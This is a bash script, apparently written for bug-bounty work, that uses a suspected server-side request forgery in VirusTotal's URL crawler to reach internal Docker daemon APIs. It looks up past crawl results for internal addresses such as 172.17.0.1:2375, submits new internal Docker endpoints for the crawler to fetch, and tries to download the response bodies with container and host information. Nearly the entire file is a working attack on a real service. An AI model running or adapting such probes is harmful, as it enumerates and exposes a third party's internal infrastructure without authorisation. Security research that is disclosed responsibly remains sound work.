#!/usr/bin/env bash
# CRITICAL: Docker API returned HTTP 200 (4758 bytes) from VT's SSRF
# Step 1: Identify the exact Docker URL fetched and get full response details
# Step 2: Attempt to read the Docker API response body
# Step 3: Probe additional Docker API endpoints
#
# Run: VT_API_KEY=<key> bash scripts/vt-docker-api-critical.sh 2>&1 | tee ~/vt-docker-critical.txt

set -euo pipefail
: "${VT_API_KEY:?Set VT_API_KEY}"
UA="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/125.0 Safari/537.36"
BASE="https://www.virustotal.com/api/v3"
OUT="$HOME/bug-bounty-hunting-/results/virustotal.com/evidence"
mkdir -p "$OUT"

c() { curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" "$@"; }

b64url() {
  python3 -c "import base64,sys; print(base64.urlsafe_b64encode(sys.argv[1].encode()).decode().rstrip('='))" "$1"
}

echo "════════════════════════════════════════════════════════════"
echo "CRITICAL INVESTIGATION: Docker API HTTP 200 via VT SSRF"
echo "URL SHA256: 97f3d5834cae5d78ed28f619e4499e778480b960390060b1a66848e448f35a9b"
echo "Response: HTTP 200, 4758 bytes — potential Docker daemon enumeration"
echo "════════════════════════════════════════════════════════════"

DOCKER_URL_ID="97f3d5834cae5d78ed28f619e4499e778480b960390060b1a66848e448f35a9b"
DOCKER_BODY_SHA="e4222715b556e7d99622c83e620d2f8e090047e56adb07923047f95828d561f2"

echo ""
echo "=== STEP 1: Get the full Docker URL object (identify exact URL fetched) ==="
DOCKER_OBJ=$(c "${BASE}/urls/${DOCKER_URL_ID}")
echo "$DOCKER_OBJ" | python3 -c "
import sys, json
d = json.load(sys.stdin)
attrs = d.get('data', {}).get('attributes', {})
print('[*] EXACT URL FETCHED:')
print('    last_final_url: ' + str(attrs.get('last_final_url', 'N/A')))
print('    url: ' + str(d.get('data',{}).get('id', 'N/A')))
print('[*] HTTP Response:')
print('    status_code: ' + str(attrs.get('last_http_response_code', 'N/A')))
print('    content_length: ' + str(attrs.get('last_http_response_content_length', 'N/A')))
print('    content_sha256: ' + str(attrs.get('last_http_response_content_sha256', 'N/A')))
print('[*] Response headers:')
hdrs = attrs.get('last_http_response_headers', {})
for k, v in hdrs.items():
    print(f'    {k}: {v}')
print('[*] times_submitted: ' + str(attrs.get('times_submitted', 'N/A')))
print('[*] last_analysis_date: ' + str(attrs.get('last_analysis_date', 'N/A')))
chain = attrs.get('redirection_chain', [])
if chain:
    print('[*] Redirect chain: ' + str(chain))
" 2>/dev/null
echo "$DOCKER_OBJ" | python3 -m json.tool 2>/dev/null > "$OUT/docker-api-url-object.json"
echo "  → Full object saved to evidence/docker-api-url-object.json"

echo ""
echo "=== STEP 2: Attempt to download the Docker API response body ==="
echo "    SHA256: ${DOCKER_BODY_SHA}"

# Try the file object first (metadata — public)
FILE_OBJ=$(c "${BASE}/files/${DOCKER_BODY_SHA}")
echo "$FILE_OBJ" | python3 -c "
import sys, json
d = json.load(sys.stdin)
if 'error' in d:
    print('  File object: ' + d['error'].get('code', 'unknown'))
else:
    attrs = d.get('data', {}).get('attributes', {})
    print('  [!!!] FILE EXISTS IN VT CORPUS')
    print('  type_tag: ' + str(attrs.get('type_tag', 'N/A')))
    print('  type_description: ' + str(attrs.get('type_description', 'N/A')))
    print('  size: ' + str(attrs.get('size', 'N/A')))
    print('  names: ' + str(attrs.get('names', [])[:5]))
    print('  tags: ' + str(attrs.get('tags', [])))
    print('  magic: ' + str(attrs.get('magic', 'N/A')))
    # Check if trid identifies it as JSON (Docker API returns JSON)
    trid = attrs.get('trid', [])
    if trid:
        print('  trid: ' + str(trid[:3]))
" 2>/dev/null
echo "$FILE_OBJ" | python3 -m json.tool 2>/dev/null > "$OUT/docker-api-response-meta.json"

# Try direct download (will 403 on Community key, but confirms it exists in corpus)
DL_CODE=$(curl -so /dev/null -w "%{http_code}" --connect-timeout 10 \
  -A "$UA" -H "x-apikey: ${VT_API_KEY}" \
  "${BASE}/files/${DOCKER_BODY_SHA}/download" 2>/dev/null)
echo "  Download attempt: HTTP ${DL_CODE}"
if [ "$DL_CODE" = "200" ]; then
  echo "  [!!!] DOWNLOADABLE WITH FREE KEY — saving body"
  curl -sk --connect-timeout 15 -A "$UA" -H "x-apikey: ${VT_API_KEY}" \
    "${BASE}/files/${DOCKER_BODY_SHA}/download" > "$OUT/CRITICAL-docker-api-response-body.json"
  echo "  Body saved to: evidence/CRITICAL-docker-api-response-body.json"
  cat "$OUT/CRITICAL-docker-api-response-body.json" | head -c 3000
elif [ "$DL_CODE" = "403" ]; then
  echo "  Premium-gated. Body in VT Intelligence corpus but requires subscription."
fi

echo ""
echo "=== STEP 3: Probe additional Docker API endpoints via SSRF ==="
echo "The Docker URL that returned 200 — we need to find what IP/port was used."
echo "Testing common Docker daemon paths on typical internal IPs."

# What we know: user submitted a "Docker API" URL that returned HTTP 200, 4758 bytes
# Common Docker daemon IPs in GCP/Docker environments:
#   172.17.0.1:2375  — Docker bridge default gateway
#   172.17.0.1:4243  — alternate Docker port
#   10.0.0.1:2375    — if running in a Docker network
#   127.0.0.1:2375   — loopback

DOCKER_ENDPOINTS=(
  "http://172.17.0.1:2375/v1.40/containers/json"
  "http://172.17.0.1:2375/v1.40/info"
  "http://172.17.0.1:2375/v1.40/version"
  "http://172.17.0.1:2375/v1.40/images/json"
  "http://172.17.0.1:2375/v1.41/containers/json"
  "http://172.17.0.1:4243/v1.40/containers/json"
  "http://172.17.0.1:4243/v1.40/info"
  "http://10.0.0.1:2375/v1.40/containers/json"
  "http://10.0.0.1:2375/v1.40/info"
  "http://127.0.0.1:2375/v1.40/containers/json"
  "http://127.0.0.1:2375/v1.40/info"
)

for url in "${DOCKER_ENDPOINTS[@]}"; do
  b64=$(b64url "$url")
  OBJ=$(c "${BASE}/urls/${b64}" 2>/dev/null)
  CODE=$(echo "$OBJ" | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'error' in d: print('NOT_IN_DB')
else: print(d.get('data',{}).get('attributes',{}).get('last_http_response_code','NOT_FETCHED'))
" 2>/dev/null || echo "error")

  if echo "$CODE" | grep -qE "^(200|201)"; then
    SHA=$(echo "$OBJ" | python3 -c "
import sys,json
d=json.load(sys.stdin)
print(d.get('data',{}).get('attributes',{}).get('last_http_response_content_sha256',''))
" 2>/dev/null)
    echo "  [!!!] HTTP ${CODE} — DOCKER API CONFIRMED: ${url}"
    echo "        Body SHA256: ${SHA}"
    echo "$OBJ" | python3 -m json.tool > "$OUT/CRITICAL-docker-$(echo "$url" | md5sum | cut -c1-6).json"
  elif echo "$CODE" | grep -qE "^[0-9]+$"; then
    echo "  [~] HTTP ${CODE} — reached: ${url}"
  else
    echo "  [-] ${CODE}: ${url}"
  fi
done

echo ""
echo "=== STEP 4: Submit new Docker API paths to VT crawler ==="
NEW_DOCKER=(
  "http://172.17.0.1:2375/v1.40/containers/json"
  "http://172.17.0.1:2375/v1.40/info"
  "http://172.17.0.1:2375/v1.40/version"
  "http://172.17.0.1:2375/v1.40/images/json"
)

for url in "${NEW_DOCKER[@]}"; do
  SUBMIT=$(c -X POST "${BASE}/urls" --data-urlencode "url=${url}")
  ID=$(echo "$SUBMIT" | python3 -c "import sys,json; print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null || echo "")
  ERR=$(echo "$SUBMIT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('error',{}).get('code',''))" 2>/dev/null || echo "")
  if [ -n "$ID" ]; then
    echo "  [+] QUEUED: ${url}"
    echo "      ID: ${ID}"
  else
    echo "  [-] ${url} → ${ERR:-failed}"
  fi
done

echo ""
echo "=== STEP 5: Wait 45s then check new Docker submissions ==="
sleep 45
for url in "${NEW_DOCKER[@]}"; do
  b64=$(b64url "$url")
  OBJ=$(c "${BASE}/urls/${b64}" 2>/dev/null)
  CODE=$(echo "$OBJ" | python3 -c "
import sys,json
d=json.load(sys.stdin)
if 'error' in d: print('NOT_IN_DB')
else:
    attrs=d.get('data',{}).get('attributes',{})
    code=attrs.get('last_http_response_code','NOT_FETCHED')
    sha=attrs.get('last_http_response_content_sha256','')
    sz=attrs.get('last_http_response_content_length','')
    hdrs=attrs.get('last_http_response_headers',{})
    print(str(code) + ' sz=' + str(sz) + ' sha=' + sha[:16] + ('...' if sha else ''))
    if hdrs:
        print('  hdrs: ' + str(hdrs)[:120])
" 2>/dev/null || echo "error")
  echo "  ${url}"
  echo "    → ${CODE}"
  if echo "$CODE" | grep -qE "^200"; then
    echo "  [!!!] DOCKER API ACCESSIBLE — saving full object"
    echo "$OBJ" | python3 -m json.tool > "$OUT/CRITICAL-docker-new-$(echo "$url" | md5sum | cut -c1-6).json"
  fi
done

echo ""
echo "════════════════════════════════════════════════════════════"
echo "SUMMARY"
echo "  If Docker API 200 confirmed on specific path → CRITICAL (VT infra enumeration)"
echo "  If response body contains container list/info → report immediately"
echo "  evidence/ directory has all URL objects and file metadata"
echo "════════════════════════════════════════════════════════════"
